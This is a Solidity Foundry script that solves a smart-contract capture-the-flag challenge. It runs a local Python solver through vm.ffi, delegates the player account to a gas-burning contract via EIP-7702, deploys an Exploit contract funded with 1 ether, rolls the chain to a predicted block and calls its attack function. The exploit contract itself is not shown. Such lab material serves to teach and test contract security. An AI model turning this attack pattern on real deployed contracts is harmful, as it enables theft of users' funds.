// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-ctf/CTFSolver.sol";

import "src/Challenge.sol";
import "src/Score.sol";
import "src/Oracle.sol";
import "script/exploit/Exploit.sol";

contract Solve is CTFSolver {
    function solve(address challengeAddress, address player) internal override {
        Challenge challenge = Challenge(challengeAddress);
        Score score = challenge.SCORE();

        // Indices are precomputed by solve.sh for the predicted solve block
        // and written to /tmp/puzzle_data.txt, then solved via solver.py
        string[] memory cmds = new string[](3);
        cmds[0] = "python3";
        cmds[1] = "script/exploit/solver.py";
        cmds[2] = "/tmp/puzzle_data.txt";
        bytes memory result = vm.ffi(cmds);
        uint256[] memory indices = abi.decode(result, (uint256[]));

        // Delegate player EOA to gas-burning receive() via EIP-7702
        uint256 playerPk = vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));
        PlayerDelegate delegate = new PlayerDelegate();
        vm.signAndAttachDelegation(address(delegate), playerPk);
        payable(player).call{value: 0}("");

        // Deploy exploit with precomputed indices
        Exploit exploit = new Exploit{value: 1 ether}(score, indices);

        // Roll to the predicted solve block so local simulation matches on-chain execution.
        // solve.sh computes SOLVE_BLOCK = current_block + 4 (4 txs: delegate, carrier, exploit, attack).
        // This cheatcode only affects simulation — on-chain, block.number is naturally correct.
        uint256 solveBlock = vm.envOr("SOLVE_BLOCK", uint256(0));
        if (solveBlock > 0) {
            vm.roll(solveBlock);
        }

        exploit.attack();
    }
}
